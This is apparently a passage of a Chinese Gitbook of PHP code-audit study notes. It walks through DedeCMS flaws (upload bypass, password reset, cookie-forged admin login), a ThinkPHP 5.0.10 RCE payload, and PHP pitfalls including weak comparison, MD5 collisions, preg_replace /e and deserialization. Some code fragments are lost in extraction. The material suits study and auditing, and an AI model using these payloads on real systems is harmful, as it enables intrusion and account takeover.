没啥用，需要配合其他漏洞 DedeCMS 进行功能点审计 全局总览 入口文件主要有三个 前台 后台：dede/ 会员：member/ 全局函数 在项目根目录的index文件包含的/include/common.inc.php中 过滤的： 检查和注册外部提交的变量，CheckRequest 文件上传的 分页参数的 函数集 include/filter.inc.php 过滤不文明内容的😅，不是为了防御漏洞的 文件上传功能点 /dede/archives_do.php 实际上是调用了upload.helper.php中的AdminUpload方法 可以看到只对文件的MIME类型进行了校验,没有对文件后缀进行校验 再看一下全局防护uploadsafe.inc.php 虽然有黑名单，但是黑名单对管理员用户无效 最后用getimagesize进行校验，可以添加文件头绕过。 综上所属，是管理员身份，只需要修改MIME和文件头即可绕过过滤。 /dede/media_add.php 跟上一个差不多，只校验MIME，不校验后缀，只是多了一步加水印的，所以传一个php后缀的图片马 /dede/file_manage_control.php 没有对内容进行过滤，这里可以写🐎 URL重定向 plus/download.php $linkinfo压根不存在，没有过滤，对url先进行base64加密，再进行url加密即可 会员任意密码修改 先看一下会员中心的逻辑 member/index.php 校验用户是否登录，登录则进入会员个人中心 member/index_do.php 会员操作与$fmdo参数匹配 重置密码 index_do.php?fmdo=user&dopost=xxx 重置密码逻辑在resetpassword.php中,大致逻辑如下 if($dopost == \"\") { include(dirname(__FILE__).\"/templets/resetpassword.htm\"); } elseif($dopost == \"getpwd\") { // 找回密码第一步 } else if($dopost == \"safequestion\") { // 密码问题判断 } else if($dopost == \"getpasswd\") { // 找回密码第二步 } 重点关注密码问题判断 使用了弱比较，如果用户没有设置密码问题，默认值如下 所以可以构造safequestion=0.0&safeanswer=来进入该if语句 跟进 sn，最终是重定向到修改密码页面 任意用户登录 看一下怎么处理的 member/config.php 跟进 对得到的M_ID做了intval处理，最后根据M_ID的值从数据库中取出对应用户 跟进getnum 跟进getcookie 两个IF，第一个if判断Cookie中的DedeUserID和DedeUserID__ckMD5,如果都存在进入第二个if，校验cookie有效性，可以看到是通过加盐再加密的方式，所以按理说是无法伪造cookie的。 但是可以从/member/index.php可以来获取这个加密后的值 搜索getcookie得到 跟踪$last_vid 如果$last_vid为空，那么将$uid赋值给$last_vid，并作为参数传递给PutCookie函数 跟进PutCookie函数 可以看到跟登录的getcookie加密方式一样。 总结一下： 登录 用户的身份由DedeUserID的值来决定 校验：DedeUserID__ckMd5的值和md5($cfg_cookie_encode.DedeUserID) 访问member/index.php?uid=xx last_vid=uid last_vid__ckMd5=md5($cfg_cookie_encode.uid) 所以让 DedeUserID=last_vid=uid DedeUserID__ckMd5=last_vid__ckMd5 就可以绕过getcookie的校验，但是还有一个问题是uid指的是用户的userid，DedeUserID指的是用户的mid，所以要让uid为mid才可以伪造身份 还记得上面的处理吗？ 所以只需要构造一个含有数字1的字符串就可以伪造admin的身份。 注册一个用户名为1admin的用户 DedeUserID=last_vid=uid DedeUserID__ckMd5=last_vid__ckMd5 ThinkPHP 安装 composer create-project --prefer-dist topthink/think=5.0.10 tp5.0.10 将 composer.json 文件的 require 字段设置成如下 \"require\": { \"php\": \">=5.4.0\", \"topthink/framework\": \"5.0.10\" } 更新 composer update 将其放置到网站目录下，访问http://127.0.0.1/tp5.0.10/public/ 概览 推荐阅读https://www.cnblogs.com/yokan/p/16102644.html 路由和参数传递 http://servername/index.php/模块/控制器/操作/[参数名/参数值...] # pathinfo模式 http://servername/index.php?s=/index/Index/index # 兼容方式 ?name=213 /name/123 如控制器Index：application/index/controller/Index.php http://127.0.0.1/tp5.0.10/public/index.php/index/Index/hello?name=world http://127.0.0.1/tp5.0.10/public/index.php/index/Index/hello/name/world http://127.0.0.1/tp5.0.10/public/index.php?s=/index/Index/hello/name/world http://127.0.0.1/tp5.0.10/public/index.php?s=/index/Index/hello&name=world Request类任意调用__construct方法导致的rce 概述 Request核心类$method 来自可控的 $_POST 数组，而且在获取之后没有进行任何检查，直接把它作为 Request 类的方法进行调用，同时，该方法传入的参数是可控数据 $_POST 。导致可以随意调用 Request 类的部分方法 过程： 让method等于 __construct魔术方法，然后里面的 foreach函数造成变量覆盖。然后通过Request 类中的 param方法最终又调用了filterValue方法，而该方法中就存在可利用的 call_user_func 函数，从而执行任意命令 Request 类中的 param、route、get、post、put、delete、patch、request、session、server、env、cookie、input 方法均调用了 filterValue 方法，而该方法中就存在可利用的 call_user_func 函数 以5.0.10版本为例 payload http://127.0.0.1/tp5.0.10/public/index.php # post _method=__construct&filter=system&cmd=whoami 调试 第一个断点下在thinkphp/libary/think/App.php文件，调用routeCheck进行调度解析这里 跟进routeCheck 跟进check 跟进method var_method在application/config.php中 所以这里可以控制method变量，从而任意调用Request类的方法。 如果调用__construct方法 存在一个foreach循环，如果传入的options数组的键名为该类的属性，就用键值覆盖该属性的值。 继续往下 在App::run()方法里面，如果我们开启了debug模式，则会调用Request::param()方法： 就算没有开启debug模式，下面的exec方法也会调用 跟进Request::param()方法 将获取到的post参数用array_merge与get方式的参数进行合并 最后将其传入input中 跟进Request::input(),array_walk_recursive 对数组中的每个成员递归地应用用户函数 然后filterValue方法中，调用了call_user_func造成任意命令执行 关键点总结 From：七月火师傅的一张流程图 其他版本 流程大同小异 payload总结：https://y4er.com/posts/thinkphp5-rce/#thinkphp5-method%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4rce Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-24 22:52:38 "},"03.代码审计/PHP/php代码审计基础.html":{"url":"03.代码审计/PHP/php代码审计基础.html","title":"PHP代码审计基础","keywords":"","body":"PHP标签 #short_open_tag = On phpinfo(); # ASP 风格的标签已在 PHP 7.0 中移除，不建议使用。 代码执行函数 eval 传参?1=system('payload');，需要在语句末加上； 也可以传参?1=saduasgdasda;system('payload');,因为eval 函数在执行时，第一条命令执行失败并不会影响第二条。 也可以传参?1=?> assert ?1=system('payload') 不需要在语句末加上； eval和assert二者区别--注意 php5中assert是一个函数，我们可以通过$f='assert';$f(...);这样的方法来动态执行任意代码。 但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码 preg_replace的/e模式 php版本 preg_replace('/pattern/e',$command,$value ); 在/e模式下，如果正则匹配成功，就会命令执行preg_replace()的第二个参数 create_function PHP 7.2.0 起被废弃，并自 PHP 8.0.0 起被移除 此函数在内部执行 eval()，因此具有跟 eval() 相同的安全问题。 create_function($a,$b); 等价于 function lambda($a){ $b; } 当$b=1;}phpinfo();/*时 function lambda($a){ 1;}phpinfo();/* } 整理一下 function lambda($a) { 1; } phpinfo(); /*} 执行了phpinfo() call_user_func() call_user_func_array()，第二个参数要为数组 变量函数 PHP 如果在一个变量后面加上一对括号，那么解释器会试图寻找名字和这个变量的值一样的一个函数，如果找到了就执行它。 所以php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数。 数组函数 array_map 相当于执行了两次whoami命令 array_filter 参数位置换了一下 usort、uasort PHP 命令执行函数 相关函数 # 默认无回显 exec() shell_exec()和反引号 popen()，proc_open() # 默认有回显 system() passthru() exec() string exec ( 命令，结果数组 ，状态码 ) system() string system ( 命令, 状态码 ) 实际上是执行了sh -c \"command\"命令 system()函数执行有回显，将执行结果输出到页面上 passthru() void passthru ( 命令, 状态码 ) 和system函数类似，执行有回显，将执行结果输出到页面上 shell_exec()和 反引号 string shell_exec( 命令 ) shell_exec()函数默认无回显，通过 echo 可将执行结果输出到页面 shell_exec() 函数实际上仅是反撇号 () 操作符的变体，当禁用shell_exec时，` 也不可执行 反引号在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回 popen() resource popen ( string $command , string $mode ) 函数需要两个参数，一个是执行的命令command，另外一个是指针文件的连接模式mode，有r和w代表读和写。 函数不会直接返回执行结果，而是返回一个文件指针，但是命令已经执行。 proc_open()函数 与popen()类似，只是可以开两个管道。 文件操作函数 https://www.php.net/manual/zh/ref.filesystem.php fopen() 模式 :- - r 读 r+ 读写，前置 w 写入，截断 w+ 读写，截断 a 写，追加 a+ 读写，追加 写入文件 \"); ?> 读取文件 readfile(filename) file_get_contents(filename) highlight_file(filename,默认false) false:才会将内容打印出来 show_source(filename) 命令执行 删除文件 复制文件 copy(源文件,目的文件) 读取目录 scandir('.')等价于scandir('./')都是得到当前目录下的文件 以数组的形式返回 查找文件或目录 glob() 类似于find 以数组的形式返回 文件上传 Content-Disposition: form-data; name=\"file\"; filename='xxx' # ['file']是Content-Disposition中name的值 $_FILES['file']['name'] 客户端文件名称 $_FILES['file']['type'] 文件的MIME类型 image/jpeg,image/png,application/octet-stream $_FILES['file']['size'] 文件大小 单位字节 $_FILES['file']['tmp_name'] 文件被上传后再服务器端临时文件名，可以在php.ini中指定 # 加入文件头绕过：GIF89a getimagesize() 图片大小 exif_imagetype() 图片类型 上传过程 在文件上传结束后，文件默认被储存在临时文件夹中，这时必须把他从临时目录中删除或移动到其他地方，否则，脚本运行完毕后，自动删除临时文件，可以使用copy或者move_uploaded_file两个函数。 $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } 条件竞争Demo if(move_uploaded_file($temp_file, $upload_file)){ # move_uploaded_file成功后才判断是否合法 if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); } }else{ $msg = '上传出错！'; } 原理：服务端先将上传的文件写入，再判断是否合法，通过条件竞争在文件删除前访问webshell写入新的webshell即可。 SSRF函数 file_get_contents 将整个文件读入一个字符串 支持本地文件和远程文件 curl_exec() 执行给定的 curl 会话。 Call to undefined function curl_init()错误解决 fsockopen 使用socket跟服务器建立tcp连接，传输原始数据。 ?host=127.0.0.1&port=80&data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo data--> GET /flag.php HTTP/1.1 Host: 127.0.0.1 Connection: Close 文件包含函数 require():找不到被包含的文件会产生致命错误，并停止脚本运行 include():找不到被包含的文件只会产生警告，脚本继续执行 require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含 include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含 变量覆盖 extract() # 从数组中将变量导入到当前的符号表 import_request_variables()--php $$ >>hello world hello world # ${$a}等同于$hello # 存在变量覆盖Demo $auth=0; foreach ($_GET as $key => $value) { $$key=$value; } echo $auth; parse_str(query,variabal) 用户传参 $_GET $_POST $_COOKIE $_REQUEST $_FILES $_SERVER $GLOBALS $_SERVER[xx] 获取当前url路径的函数及服务器变量 https://www.cnblogs.com/qiantuwuliang/archive/2010/02/28/1675279.html $_SERVER[\"QUERY_STRING\"]：查询(query)的字符串 $_SERVER[\"PHP_SELF\"]：当前正在执行脚本的文件名 获取所有变量/函数/常量 get_defined_functions get_defined_constants get_defined_vars 其他 大小写 在 PHP 中，关键字（例如if、 else、while、 echo等）、类、函数和用户定义的函数不区分大小写。 但是所有变量名都区分大小写！ \"; echo \"Hello World!\"; EcHo \"Hello World!\"; ?> -->Hello World! PHP接收参数 https://blog.csdn.net/bylfsj/article/details/102770461 https://y4tacker.blog.csdn.net/article/details/120502141 PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] => \"bar\") php从请求的url中取出参数并保存之前，对参数名的操作： 1.删除参数名前的一些符号 2.将某些字符转换为下划线（尝试后[好像不能被解析为_） 3.删除参数名后的一些符号 弱类型比较 PHP7以前的版本支持将多进制的数值转换，所以'1'=='0x1'是成立的，但新版本是false。 ==（宽松比较） NULL == false == 0 [false] == [0] == [NULL] == [''] 其他数字==True 数字字符串与数字 这是因为在执行关系运算”==“时要求运算符两边的数据类型必须一致(字符串与整型比较，字符串→整型)，当字符串转换为整型时，如果字符串以整型开头或者以空格+整型开头，就取整型的值，反之则取值0. 例子 if (!is_numeric($passwd)) { if($passwd==1234567) { echo $flag; } } payload:passwd=1234567sdkasj (不要加引号,默认接收字符串参数) 0e科学计数法 var_dump(\"0e123456\"==\"0e4456789\"); //true var_dump(\"0e123456\"==\"0easdasd9\");//false 而当字符串中含有0e/0E时，php会将0e这类字符串识别为科学技术法的数字，而0的多少次方都等于0，所以相等。 ===（严格比较） >>false 全等于操作过程如下： 1.判断两边数据类型是否相同 2.判断两边值是否相同 3.将前两步的结果进行与运算，得出最终结果 MD5缺陷 ①MD5（string,raw）函数解析 >>276f722736c95d99e921722cf9ed621c 'or'6�]��!r,��b\u001c 当raw=true时，浏览器会对其返回的数据'or'6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c（原始二进制格式）进行了字符化处理，由此就会产生乱码。 我们可以发现得到的字符串含有'or'6,,可以用来进行sql注入 如select * from 'admin' where password=md5($pass,true) >> 04a5c23ac138da22 2fec392304a5c23ac138da22847f9b7c 我们可以发现md5的密文中，16位密文与32位密文的第8-24位子字符串是一样的。 ②弱类型比较 PHP在处理哈希字符串时，通过!=或==来对哈希值进行比较，当哈希值开头为0e时，在比较的时候会将其视作为科学计数法，而0的多少次方还是0 所以MD5('QNKCDZO')==md5('s878926199a') QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 1586264293 0e622743671155995737639662718498 240610708 0e462097431906509019562988736854 $a==md5($a) $a=0e215962017 md5($a)=0e291242476940776845150308577824 ③强比较绕过 在使用===或！==来进行强比较时 可以通过构造参数为数组类型来进行绕过 原理：md5()函数无法处理数组类型的数值，会直接返回NULL 那么MD5(param1[])===MD5(param2[])从而绕过 当然弱类型比较也可以使用这种方法来进行绕过 if (md5($id) === md5($gg) && $id !== $gg) >>payload:id[]=xxx&gg[]=xxx 但是当限制了传入的参数必须为string类型时上述方法就不可以了 if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) { echo 1; } else { echo 0; } 使用md5碰撞生成相同md5 使用burp发送如下 url编码 1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%CEZr%C6%1D%28j%22%9E%60%8Dt%AB4%ADU%E5%8B%89%89%E6j%D0FH%EE8%D1%E6%11%18%AB3%A6%EC%E3%B8%2F%3C%97k%0CIt%02%94%92W%9D%ED%B9%EDc%CC%5D%2A%A1%9B%B3%7B%27%13i%05%8A%A7%5E%B3J%BE.R%A6%D7%D5%7C%A4%24%A5%DB%84%D8%E7%A3%03%E4F%EC%1C%95%B1%D6L%88%AD%CD%D5%CF%B6%E8%26%AEff%2A%3B%C9%D9%9B%C8z%7E%DB%A4m%C5%8F%CF%83%06%5E%EA%CCW%B3M%3E%C8 url编码 1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%CEZr%C6%1D%28j%22%9E%60%8Dt%AB4%ADU%E5%8B%89%09%E6j%D0FH%EE8%D1%E6%11%18%AB3%A6%EC%E3%B8%2F%3C%97k%0CIt%02%14%93W%9D%ED%B9%EDc%CC%5D%2A%A1%9B%B3%FB%27%13i%05%8A%A7%5E%B3J%BE.R%A6%D7%D5%7C%A4%24%A5%DB%84%D8%E7%23%03%E4F%EC%1C%95%B1%D6L%88%AD%CD%D5%CF%B6%E8%26%AEff%2A%3B%C9%D9%9BHz%7E%DB%A4m%C5%8F%CF%83%06%5E%EA%CC%D7%B3M%3E%C8 如何生成 http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip fastcoll可以根据已知的数据头，在其后面分别附加两组128字节的数据（如果没对齐，还会加上其他数据），生成两个文件，并保证两个文件的MD5值相同。 并且根据MD5的特性：在两个MD5相同的文件后，如果附加上MD5相同的数据，生成的两个文件MD5依旧相同（虽然MD5会变，但是两个文件MD5相同）。就是这个公式： hash(A) = hash(B) -> hash(A + C) = hash(B + C) 根据这个结论，我们可以得到如下结论： 利用fastcoll，可以对固定开头和固定结尾的数据，生成两组不同的数据（数据内容不可控）拼接上头和尾，分别生成两个文件，保证他们的MD5相同。 语言构造器 [语言构造器和变量函数]https://segmentfault.com/q/1010000000188609 当解释器遇到： echo 'Hello world'; 这样的一个表达式的时候，并不会把它转换成函数调用，而是直接映射到一系列预先定义好的操作。使用语言构成的时候可以加括号，也可以不加括号，但是使用函数的时候必须加括号。 精度缺陷 php最大精度是14位，如果超出14位会衰减 if($this->trick1 !== $this->trick2 && md5($this->trick1) === md5($this->trick2) && $this->trick1 != $this->trick2) { echo 'success'; } payload trick1=0.1&trick2=0.100000000000001 都为INF/NAN(极小/极大) strcmp()--数值比较 使用条件：php>=5.3 当程序逻辑进行了数值的比较时，可以尝试比较函数是否为strcmp() int strcmp ( string $str1 , string $str2 ) 如果 str1 小于 str2 返回 0；如果两者相等，返回 0。(区分大小写) 但是strcmp()比较的对象是字符串和数组的时候，虽然会报错，但是仍然会直接返回0，这样通过把目标变量设置成数组就可以绕过该函数的限制。 #php7.0 >>Warning: strcmp() expects parameter 2 to be string, array given in /usercode/file.php on line 3 Success! intval()--php5 is_numeric（） $s = is_numeric($_GET['s'])?$_GET['s']:0; $sql=\"insert into test(type)values($s);\"; //是 values($s) 不是values('$s') mysql_query($sql); 上面这个片段程序是判断参数s是否为数字，是则返回数字，不是则返回0，然后带入数据库查询。（这样就构造不了sql语句） 我们可以把‘1 or 1' 转换为16进制 0x31206f722031 为s参数的值 l array_search/in_array 大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。 参数：(mixed $needle, array $haystack, bool $strict = false): bool 当模式为false时，其查找是通过==来比较的 当模式为true时，其查找是通过===来比较的 escapeshellarg和escapeshellcmd https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html https://www.anquanke.com/post/id/107336 preg preg-match（正则表达式，待匹配字符串，捕获分组） preg_match()返回 pattern 的匹配次数。 它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。 漏洞 1.参数为字符串，传递数组返回false 2.利用PCRE回溯次数限制绕过 php低版本 2.非/s模式下不匹配换行符%0a 3.非/m模式下不匹配多行 preg_replace（正则表达式，替换字符，待匹配字符串，替换次数） 替换次数默认为1，可以用双写绕过 /e模式下的代码执行 （php5.5版本以下） buu--[BJDCTF2020]ZJCTF，不过如此 $value){ echo complexStrtolower($regex, $value) . \"\\n\"; } highlight_file(__FILE__); ?> 在/e模式下，如果正则匹配成功，就会执行preg_replace()的第二个参数 相当于 eval('strtolower(\"\\1\");') 如何利用\\1实现代码执行呢？ 注意到第一个参数所代表的正则表达式，是将匹配到的字符作为捕获分组，而捕获分组下标是从1开始的，即匹配到的字符会代替\\1→eval('strtolower(\"payload\");') 还有一个注意点是\"payload\"是由双引号包围起来的，再配合可变变量，才能够执行任意代码。 payload \\S*=${phpinfo()} \\S*→$regex 用于正则匹配/捕获 ${phpinfo()}→$value 待匹配字符 ${phpinfo()}:要将待匹配字符构造成可变变量的形式才可以执行phpinfo() 可变变量： >> hello world basename basename会忽略一些奇怪的字符%80 ~ %ff。 buu ----[Zer0pts2020]Can you guess it? include 'config.php'; // FLAG is defined in config.php if (preg_match('config\\.php\\/*$', $_SERVER['PHP_SELF'])) { exit(\"I don't know what you are thinking, but I won't let you read it :)\"); } if (isset($_GET['source'])) { highlight_file(basename($_SERVER['PHP_SELF'])); exit(); } 目标：basename($_SERVER['PHP_SELF']==config.php 需要绕过过滤config.php\\/*$，$匹配末尾，所以只要在config.php后添加字符即可绕过。 $_SERVER['PHP_SELF']：返回的是当前文件相对于根目录的路径host/$_SERVER[\"PHP_SELF\"]即url==host/$_SERVER[\"PHP_SELF\"] basename：返回当前文件名即最后一个/xxx中的xxx 为了绕过正则，需要在1.php后加字符 但是这样basename匹配到的就不是1.php了 不过basename有一个特性就是：如果匹配到的文件名头是不可打印字符，会把它忽略掉 这样basename原先匹配到的是%81，但是%81是不可打印字符，会把它忽略掉，所以就会往前匹配，匹配到1.php 伪随机数 mt_srand(x):设定随机数种子为x mt_rand(a,b):生成[a,b]间的随机数 随机数生成函数，实质上生成的是线性的伪随机数，简单来说就是y=ax，x就是种子，a是范围，y就是生成的随机数。 所以只要种子固定了，每次生成的随机数都是相同的。 已知在同一个种子下生成的多个随机数 https://blog.csdn.net/weixin_34255793/article/details/92713300 使用php_mt_seed对第一个随机数进行爆破，得到可能的种子（因为第一次调用mt_rand()函数的时候种子就确定下来了） 然后用得到的种子来生成随机数，进行比对即可得到正确的种子 已知第一个随机数 https://blog.csdn.net/qq_52907838/article/details/119824220 php_mt_seed中给出的方法 对应脚本 关于php_mt_seed https://www.openwall.com/php_mt_seed/ $_SERVER变量缺陷 '; echo ''; echo '$_SERVER[QUERY_STRING] '; var_dump($_SERVER['QUERY_STRING']); echo ''; echo ''; echo '$_REQUEST '; var_dump($_REQUEST); echo ''; echo ''; echo '$_SERVER '; var_dump($_SERVER); echo ''; echo ''; $_SERVER['PHP_SELF']：返回的是当前文件相对于根目录的路径host/$_SERVER[\"PHP_SELF\"]即url==host/$_SERVER[\"PHP_SELF\"] parse_url 使用方法 用于解析url，获得url的组成部分 '; $parts = parse_url($url); var_dump($parts); ?> >> http://www.zcool.com.cn/suning?p=69#tab_anchorarray(5) { [\"scheme\"]=> string(4) \"http\" [\"host\"]=> string(16) \"www.zcool.com.cn\" [\"path\"]=> string(7) \"/suning\" [\"query\"]=> string(4) \"p=69\" [\"fragment\"]=> string(10) \"tab_anchor\" } 漏洞 不应该将其作为检验url是否合法的手段 解析失败 #/test/1.php http://127.0.0.1/test/1.php?aaa=1 我们查询的字符串被拦截，没有输出a=1 http://127.0.0.1///test/1.php?aaa=1 在正常路径前加上//，parse_url就会解析失败，从而绕过过滤，成功输出a=1 端口解析错误 php5.5以上 >> array(3) { [\"host\"]=> string(11) \"pupiles.com\" [\"port\"]=> int(1234) [\"path\"]=> string(11) \"/about:1234\" } parse_url解析出了端口号，认为访问的是pupiles.com的1234端口下的about:1234文件，而实际上是访问pupiles.com下的about:1234文件 路径解析错误 >> Array ( [path] => /upload ) Array ( [host] => upload ) 可以看到parse_url解析时，/xxx解析为路径，//xxx解析为主机 is_file if($file == \"f14g.php\" OR is_file($file)) { echo file_get_contents($file); } else{ echo false; } 伪协议 is_file检测除了file外的伪协议都是false 假目录 ./xxx/../f14g.php strip_tags if (strstr(strtolower($file['name']), \".php\") ) { return false; } $file['name'] = strip_tags($file['name']); payload $file['name']=1.<>php Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-28 18:49:36 "},"03.代码审计/PHP/php反序列化.html":{"url":"03.代码审计/PHP/php反序列化.html","title":"PHP反序列化","keywords":"","body":"概念 序列化是将对象转化为数据字节流，反序列化是将数据字节流转换成对象。例如java采用二进制序列，PHP采用可见字符串序列。 PHP反序列化漏洞主要发生在反序列化期间一些魔术方法的自动调用上 序列化 非类序列化 相比于类序列化少了对象名长度和对象名称 1,'b'=>2); echo serialize($b); ?> >>s:8:\"flag.php\" >>a:2:{s:1:\"a\";i:1;s:1:\"b\";i:2;} 类序列化 name = 18 } } $a=new info(); echo serialize($a); ?> 可以发现序列化时只会序列化类的属性，而不会序列化类的方法。 类属性权限对序列化的影响 >>O:4:\"info\":3:{s:4:\"name\";i:19;s:4:\"*b\";s:3:\"123\";s:7:\"infoc\";s:4:\"khaz\";} 如果仔细观察会发现protected和private变量序列化后变量名长度发生了变化 s:4:\"*b\"; s:7:\"infoc\" 我们用010打开1.txt ​ 可以发现protected序列化后，会在变量名前加上%00*%00 ​ 而private序列化后，会在变量名前加上%00类名%00 在实际运用中可以用\\00（空）用%00代替 原因：php的urlencode()会自动把空编码成%00 魔术方法 PHP: 魔术方法 - Manual 常见 //类的构造函数，创建类对象时调用 __construct() //类的析构函数，对象销毁时调用 __destruct() //执行serialize()时，会先调用这个函数，再调用construct函数 __sleep() //执行unserialize()时，会先调用这个函数，再调用destruct函数 __wakeup() /* 当调用的方法不存在时触发 $name: 被调用方法的名字 $arguments：传递给被调用方法的参数 */ __call(string $name, array $arguments) /* 类被当成字符串时 1.输出对象：echo/print等 2.函数的参数类型为字符串，将对象作为参数时 */ __toString() __invoke() 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。 >>触发了ivoke魔术方法 不可访问（protected 或 private）或不存在的属性 赋值时，__set() 会被调用。 读取时，__get() 会被调用。 调用 isset() 或 empty() 时，__isset() 会被调用。 调用 unset() 时，__unset() 会被调用。 其他 __set_state()，调用var_export()导出类时，此静态方法会被调用。 __clone()，当对象复制完成时调用 __autoload()，尝试加载未定义的类 __debugInfo()，打印所需调试信息 反序列化漏洞 原理 有序列化就有反序列化，漏洞点就产生于反序列化时。 因为序列化数据中存储的是类对象的属性，如果未对用户输入的序列化字符串进行检测，攻击者就可以构造恶意序列化数据，控制反序列化过程，从而覆盖变量，进而导致代码执行，SQL 注入，目录遍历等不可控后果。 攻击思路 定位序列化和反序列化代码，找到可控参数和反序列化对象 明确要利用的方法和属性 根据其所在类的魔术方法构造pop链（传入参数到触发关键函数,注意类属性的类型） 在 PHP7.2+的环境中，使用 public 修饰成员并序列化，反序列化后成员也会被 public 覆盖修饰。 传递构造好的序列化内容(最好要urlencode一下)，触发反序列化，完成攻击 Demo str->flag; } } class get { private $flag; public function __get($name) { include($name.$this->flag); return $flag;//flag in flag.php } } if(isset($_GET['a'])) { $a = unserialize($_GET['a']); echo $a; } else { highlight_file(__FILE__); } 这里目的是要触发 get() 这个函数，魔术方法get()会在由外部访问对象中的私有属性时自动调用，其中参数伪访问属性的属性名。再观察example这个类，这里发现 toStrong() 方法，而又存在 echo $a 这句，所以可以确定要构造的这个 $a 就是 example这个类的对象，而且这个对象中的属性 $flag 也应为 get 这个类的对象，从而 执行 return $this->str->flag时就会跳转到 get 对象的 魔术方法 get($name) （$name为要访问的私有属性的名称，即 flag 这个属性名）。 即链子为 反序列化入口unserialize() → example::__tostring() → get::__get() → 执行危险操作include() 之后要 include 'flag.php'，由于$name == flag，所以要构造 $flag == ‘.php’ ，拼接起来就可以包含 ‘flag.php’ 从而拿到flag。 即 flag = $flag; } } $a = new example(); $b = new get('.php'); $a->str = $b; echo urlencode(serialize($a)); phar反序列化--PHP phar是什么 功能：压缩文件，将内容序列化存储 如何生成： 注意：要将php.ini中的phar.readonly选项设置为Off,并删除前面的;否则无法生成phar文件。 startBuffering(); //设置stub $phar->setStub(\"\"); //将自定义的meta-data存入manifest $a = new User(); $phar->setMetadata($a); //添加要压缩的文件 $phar->addFromString(\"test.txt\", \"test\"); //签名自动计算 $phar->stopBuffering(); ?> 文件格式 用010打开生成的test.phar，观察phar文件的四个组成部分 ​ 关注stub和manifest ​ stub：phar识别标志，只要有了这个识别标志，即使后缀名不为phar，php仍能够将文件识别为phar文件 ​ manifest：这一部分是我们可控的地方，是反序列化漏洞的关键点 ​ signature：当我们需要改变phar文件内容时，需要重新生成签名 ​ 漏洞成因 phar中manifest是用户自定义的 php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化. 注意：使用phar://伪协议解析phar文件时，要使用文件的绝对路径 3.受到影响的函数 From https://blog.zsxsoft.com/post/38?from=timeline&isappinstalled=0 ​ 绕过 绕过phar开头 compress.bzip://phar:///test.phar/test.txt compress.bzip2://phar:///test.phar/test.txt compress.zlib://phar:///home/sx/test.phar/test.txt php://filter/read=convert.base64-encode/resource=phar://phar.phar 绕过phar标识符 gzip phar.phar #使用压缩后phar文件同样也能反序列化 绕过文件后缀和内容 ​ 将1.phar改名为1.jpg，再给压缩gzip 1.jpg得到1.jpg.gz文件，修改名字为1.jpg上传 session反序列化 https://xz.aliyun.com/t/6640#toc-5 session工作流程 session序列化 PHP session的存储机制是由session.serialize_handler来定义引擎的，默认是以文件的方式存储，且存储的文件是由sess_sessionid来决定文件名的。 通常文件名为sess_sessionid的形式，默认的引擎是php 产生的原因 session序列化和反序列化所使用到的引擎不同 例如 第一次请求，序列化用的引擎为php 假设要保存到session的数据为username=khaz php怎么知道要保存哪些数据到session中 通过在$_SESSION环境变量注册 #将username变量保存到session中 会话结束后，将$_SESSION序列化保存到session文件中。 正常保存 a:1:{s:8:\"username\";s:4:\"Khaz\";} 如果我们构造username=|a:1:{s:8:\"passwd\";s:4:\"Khaz\";} a:1:{s:8:\"username\";s:31:\"|a:1:{s:8:\"passwd\";s:4:\"Khaz\";}\";} 第二次请求，反序列化用的引擎为php_serialize 正常 a:1:{s:8:\"username\";s:4:\"Khaz\";} → $_SESSION['username']=Khaz 攻击 a:1:{s:8:\"username\";s:31:\"|a:1:{s:8:\"passwd\";s:4:\"Khaz\";}\";} → $_SESSION['passwd']=Khaz 从而我们就可以自定义$_SESSION环境变量的值 过滤不当导致的字符串逃逸反序列 形成原因 php反序列化特点 以}作为结束符，在}之后的字符会被舍去 >> array(2) { 'a' => int(1) 'b' => int(2) } 反序列化时会根据前面给定的长度，读取对应长度的字符串 >> array(2) { 'a\";\"' => int(1) 'b' => int(2) } 当序列化的长度/数量与实际不符时，反序列化会报错 1,b=>2,只有两个值 var_dump(unserialize($b)); var_dump(unserialize($a)); ?> >> error error 